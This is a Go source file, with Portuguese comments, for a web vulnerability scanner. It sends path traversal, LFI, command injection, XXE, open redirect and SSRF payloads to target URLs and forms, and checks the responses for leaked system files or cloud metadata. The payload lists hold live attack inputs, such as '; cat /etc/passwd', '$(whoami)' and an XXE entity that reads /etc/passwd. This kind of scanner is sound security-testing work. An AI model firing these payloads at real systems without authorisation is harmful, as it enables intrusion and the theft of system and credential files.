package scanner

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// AdvancedVulnResult resultado de testes avançados
type AdvancedVulnResult struct {
	Type        string
	Vulnerable  bool
	Description string
	Evidence    string
	Severity    string
	Payload     string
}

// TestDirectoryTraversal testa path traversal
func TestDirectoryTraversal(baseURL string, client *http.Client) []AdvancedVulnResult {
	var results []AdvancedVulnResult

	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
	}

	indicators := []string{
		"root:",
		"[extensions]",
		"for 16-bit app support",
		"/bin/bash",
	}

	for _, payload := range payloads {
		testURL := baseURL + "?file=" + payload
		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body := make([]byte, 4096)
		n, _ := resp.Body.Read(body)
		bodyStr := string(body[:n])

		for _, indicator := range indicators {
			if strings.Contains(bodyStr, indicator) {
				results = append(results, AdvancedVulnResult{
					Type:        "Path Traversal",
					Vulnerable:  true,
					Description: "Sistema vulnerável a Directory Traversal",
					Evidence:    indicator,
					Severity:    "CRITICAL",
					Payload:     payload,
				})
				break
			}
		}
	}

	return results
}

// TestCommandInjection testa injeção de comandos
func TestCommandInjection(form Form, baseURL string, client *http.Client) []AdvancedVulnResult {
	var results []AdvancedVulnResult

	payloads := []string{
		"; ls -la",
		"| whoami",
		"& dir",
		"`id`",
		"$(whoami)",
		"; cat /etc/passwd",
		"| type C:\\windows\\win.ini",
	}

	indicators := []string{
		"root",
		"uid=",
		"gid=",
		"[extensions]",
		"Volume Serial Number",
		"Directory of",
	}

	for _, input := range form.Inputs {
		for _, payload := range payloads {
			data := buildTestData(form.Inputs, input, payload)
			
			resp, err := sendRequest(form, baseURL, data, client)
			if err != nil {
				continue
			}

			body := make([]byte, 8192)
			n, _ := resp.Body.Read(body)
			resp.Body.Close()
			bodyStr := string(body[:n])

			for _, indicator := range indicators {
				if strings.Contains(bodyStr, indicator) {
					results = append(results, AdvancedVulnResult{
						Type:        "Command Injection",
						Vulnerable:  true,
						Description: fmt.Sprintf("Campo '%s' vulnerável a injeção de comandos", input),
						Evidence:    indicator,
						Severity:    "CRITICAL",
						Payload:     payload,
					})
					break
				}
			}

			time.Sleep(100 * time.Millisecond)
		}
	}

	return results
}

// TestXXE testa XML External Entity
func TestXXE(form Form, baseURL string, client *http.Client) []AdvancedVulnResult {
	var results []AdvancedVulnResult

	xxePayload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>`

	for _, input := range form.Inputs {
		data := buildTestData(form.Inputs, input, xxePayload)
		
		resp, err := sendRequest(form, baseURL, data, client)
		if err != nil {
			continue
		}

		body := make([]byte, 4096)
		n, _ := resp.Body.Read(body)
		resp.Body.Close()
		bodyStr := string(body[:n])

		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "/bin/bash") {
			results = append(results, AdvancedVulnResult{
				Type:        "XXE (XML External Entity)",
				Vulnerable:  true,
				Description: fmt.Sprintf("Campo '%s' vulnerável a XXE", input),
				Evidence:    "Arquivo do sistema exposto",
				Severity:    "CRITICAL",
				Payload:     xxePayload,
			})
		}
	}

	return results
}

// TestLFI testa Local File Inclusion
func TestLFI(baseURL string, client *http.Client) []AdvancedVulnResult {
	var results []AdvancedVulnResult

	params := []string{"file", "page", "include", "view", "template", "doc", "document"}
	payloads := []string{
		"/etc/passwd",
		"../../../etc/passwd",
		"../../../../../../etc/passwd",
		"C:\\windows\\win.ini",
		"..\\..\\..\\windows\\win.ini",
	}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s?%s=%s", baseURL, param, payload)
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}

			body := make([]byte, 4096)
			n, _ := resp.Body.Read(body)
			resp.Body.Close()
			bodyStr := string(body[:n])

			if strings.Contains(bodyStr, "root:") || 
			   strings.Contains(bodyStr, "[extensions]") ||
			   strings.Contains(bodyStr, "for 16-bit app support") {
				results = append(results, AdvancedVulnResult{
					Type:        "LFI (Local File Inclusion)",
					Vulnerable:  true,
					Description: fmt.Sprintf("Parâmetro '%s' vulnerável a LFI", param),
					Evidence:    "Arquivo local incluído na resposta",
					Severity:    "CRITICAL",
					Payload:     payload,
				})
				break
			}

			time.Sleep(50 * time.Millisecond)
		}
	}

	return results
}

// TestOpenRedirect testa redirecionamentos abertos
func TestOpenRedirect(form Form, baseURL string, client *http.Client) []AdvancedVulnResult {
	var results []AdvancedVulnResult

	payloads := []string{
		"https://evil.com",
		"//evil.com",
		"javascript:alert(1)",
		"http://google.com",
	}

	// Desabilita follow redirects
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	defer func() {
		client.CheckRedirect = nil
	}()

	for _, input := range form.Inputs {
		for _, payload := range payloads {
			data := buildTestData(form.Inputs, input, payload)
			
			resp, err := sendRequest(form, baseURL, data, client)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				location := resp.Header.Get("Location")
				if strings.Contains(location, payload) || 
				   strings.Contains(location, "evil.com") ||
				   strings.Contains(location, "google.com") {
					results = append(results, AdvancedVulnResult{
						Type:        "Open Redirect",
						Vulnerable:  true,
						Description: fmt.Sprintf("Campo '%s' vulnerável a redirecionamento aberto", input),
						Evidence:    location,
						Severity:    "MEDIUM",
						Payload:     payload,
					})
				}
			}
		}
	}

	return results
}

// TestSSRF testa Server-Side Request Forgery
func TestSSRF(form Form, baseURL string, client *http.Client) []AdvancedVulnResult {
	var results []AdvancedVulnResult

	payloads := []string{
		"http://127.0.0.1",
		"http://localhost",
		"http://169.254.169.254", // AWS metadata
		"http://metadata.google.internal", // GCP metadata
		"file:///etc/passwd",
	}

	for _, input := range form.Inputs {
		for _, payload := range payloads {
			data := buildTestData(form.Inputs, input, payload)
			
			startTime := time.Now()
			resp, err := sendRequest(form, baseURL, data, client)
			duration := time.Since(startTime)

			if err == nil {
				body := make([]byte, 4096)
				n, _ := resp.Body.Read(body)
				resp.Body.Close()
				bodyStr := string(body[:n])

				// Verifica indicadores de SSRF
				if strings.Contains(bodyStr, "ami-id") || // AWS metadata
				   strings.Contains(bodyStr, "instance-id") ||
				   strings.Contains(bodyStr, "root:") ||
				   duration < 100*time.Millisecond { // Resposta rápida de localhost
					results = append(results, AdvancedVulnResult{
						Type:        "SSRF (Server-Side Request Forgery)",
						Vulnerable:  true,
						Description: fmt.Sprintf("Campo '%s' vulnerável a SSRF", input),
						Evidence:    "Requisição para recurso interno aceita",
						Severity:    "CRITICAL",
						Payload:     payload,
					})
				}
			}
		}
	}

	return results
}

// PrintAdvancedResults imprime resultados de testes avançados
func PrintAdvancedResults(results []AdvancedVulnResult) {
	if len(results) == 0 {
		fmt.Println("\n[+] Nenhuma vulnerabilidade avançada detectada")
		return
	}

	fmt.Println("\n[!!!] VULNERABILIDADES AVANÇADAS DETECTADAS:")
	fmt.Println(strings.Repeat("=", 80))

	for i, result := range results {
		fmt.Printf("\n[%d] %s - Severidade: %s\n", i+1, result.Type, result.Severity)
		fmt.Printf("    Descrição: %s\n", result.Description)
		fmt.Printf("    Evidência: %s\n", result.Evidence)
		fmt.Printf("    Payload: %s\n", result.Payload)
	}

	fmt.Println(strings.Repeat("=", 80))
}

// buildTestData constrói dados de teste para formulários
func buildTestData(inputs []string, targetField string, payload string) url.Values {
	data := url.Values{}
	for _, input := range inputs {
		if input == targetField {
			data.Set(input, payload)
		} else {
			data.Set(input, "test")
		}
	}
	return data
}

// sendRequest envia requisição HTTP para o formulário
func sendRequest(form Form, baseURL string, data url.Values, client *http.Client) (*http.Response, error) {
	target := baseURL
	if form.Action != "" && form.Action != "#" {
		if strings.HasPrefix(form.Action, "http") {
			target = form.Action
		} else if strings.HasPrefix(form.Action, "/") {
			// Parse base URL para pegar só o domínio
			parsedURL, err := url.Parse(baseURL)
			if err == nil {
				target = parsedURL.Scheme + "://" + parsedURL.Host + form.Action
			}
		} else {
			target = baseURL + "/" + form.Action
		}
	}

	if form.Method == "POST" {
		return client.PostForm(target, data)
	}
	
	fullURL := target + "?" + data.Encode()
	return client.Get(fullURL)
}
